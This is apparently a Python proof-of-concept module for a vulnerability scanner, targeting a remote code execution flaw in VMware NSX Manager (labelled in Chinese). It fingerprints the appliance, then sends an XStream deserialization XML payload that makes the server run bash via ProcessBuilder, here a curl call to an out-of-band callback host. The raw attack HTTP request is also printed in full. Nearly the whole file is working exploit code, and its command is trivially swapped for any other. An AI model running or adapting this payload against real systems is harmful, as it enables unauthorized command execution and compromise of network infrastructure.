import time
import uuid

import WebLog
from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """攻击数据包如下：

```
PUT /api/2.0/services/usermgmt/password/abc HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Connection: close
Content-Type: application/xml
Content-Length: 546

<sorted-set>
        <string>foo</string>
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
              <command>
                <string>bash</string>
                <string>-c</string>
                <string>cmd</string>
              </command>
            </target>
            <action>start</action>
          </handler>
        </dynamic-proxy>
      </sorted-set>
```"""
        self.name = "VMware NSX Manager XStream 远程代码执行漏洞"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "<title>VMware Appliance Management</title>" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        target_id = uuid.uuid4().hex
        c = WebLog.create('url.contains("{}")'.format(target_id))
        client = Http()
        client.url = urljoin(self.target, "/api/2.0/services/usermgmt/password/abc")
        client.data = """<sorted-set>
        <string>foo</string>
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
              <command>
                <string>bash</string>
                <string>-c</string>
                <string>curl {}/{}</string>
              </command>
            </target>
            <action>start</action>
          </handler>
        </dynamic-proxy>
      </sorted-set>""".format(WebLog.rev_url, target_id)
        client.headers["Content-Type"] = "application/xml"
        client.put()
        if WebLog.get(c).requested:
            return True
        else:
            return False
